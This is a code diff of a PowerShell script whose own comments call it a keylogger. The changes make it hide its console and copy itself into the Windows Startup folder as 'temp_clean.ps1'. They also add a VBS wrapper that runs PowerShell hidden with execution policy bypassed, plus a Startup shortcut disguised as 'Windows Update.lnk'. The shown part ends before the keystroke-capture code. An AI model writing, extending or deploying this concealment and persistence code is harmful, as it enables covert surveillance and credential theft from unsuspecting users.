@@ -15,31 +15,44 @@ public class K {
 '@
 Add-Type -TypeDefinition $keyboardCode
 
-# Silent self-copy to Startup folder
+# HIDE CONSOLE IMMEDIATELY
+$consolePtr = [K]::GetConsoleWindow()
+[K]::ShowWindow($consolePtr, 0)
+
+# Check if this is first run or background run
 $startupPath = [Environment]::GetFolderPath('Startup')
 $currentScript = $MyInvocation.MyCommand.Path
+$startupScriptPath = Join-Path $startupPath "temp_clean.ps1"
 
+# Determine if we need to setup startup
+$shouldSetupStartup = $false
 if (-not [string]::IsNullOrEmpty($currentScript)) {
-    $newName = "temp_clean.ps1"
-    $targetPath = Join-Path $startupPath $newName
+    # If script is not already in startup folder, setup startup
+    $shouldSetupStartup = $currentScript -ne $startupScriptPath
+}
+
+if ($shouldSetupStartup) {
+    # FIRST RUN - SETUP STARTUP AND LAUNCH BACKGROUND VERSION
     
+    # Ensure Startup folder exists
     if (-not (Test-Path $startupPath)) {
         New-Item -ItemType Directory -Path $startupPath -Force | Out-Null
     }
     
-    Copy-Item -Path $currentScript -Destination $targetPath -Force | Out-Null
+    # Copy script to Startup
+    Copy-Item -Path $currentScript -Destination $startupScriptPath -Force | Out-Null
     
-    # Create VBS wrapper
+    # Create VBS wrapper for silent execution
     $vbsPath = Join-Path $startupPath "temp_clean.vbs"
     $vbsContent = @"
 Set objShell = CreateObject("WScript.Shell")
-objShell.Run "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File ""$targetPath""", 0, False
+objShell.Run "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File ""$startupScriptPath""", 0, False
 Set objShell = Nothing
 "@
     
     $vbsContent | Out-File -FilePath $vbsPath -Encoding ASCII
     
-    # Create shortcut
+    # Create shortcut in Startup
     $wsh = New-Object -ComObject WScript.Shell
     $shortcutPath = Join-Path $startupPath "Windows Update.lnk"
     $shortcut = $wsh.CreateShortcut($shortcutPath)
@@ -48,11 +61,19 @@ Set objShell = Nothing
     $shortcut.WindowStyle = 7
     $shortcut.Save()
     
-    Start-Process "wscript.exe" -ArgumentList "//B `"$vbsPath`"" -WindowStyle Hidden
-
-
+    # Launch the background version from Startup
+    $process = Start-Process "wscript.exe" -ArgumentList "//B `"$vbsPath`"" -WindowStyle Hidden -PassThru
+    
+    # Give it a moment to start, then exit
+    Start-Sleep -Seconds 2
+    
+    # Force exit - this closes the PowerShell window when run from command line
+    [Environment]::Exit(0)
     exit
 }
+
+# IF WE REACH HERE, WE'RE THE BACKGROUND INSTANCE RUNNING FROM STARTUP
+# Continue with keylogger functionality...
 
 # Setup - IMPROVED
 $buffer = ''
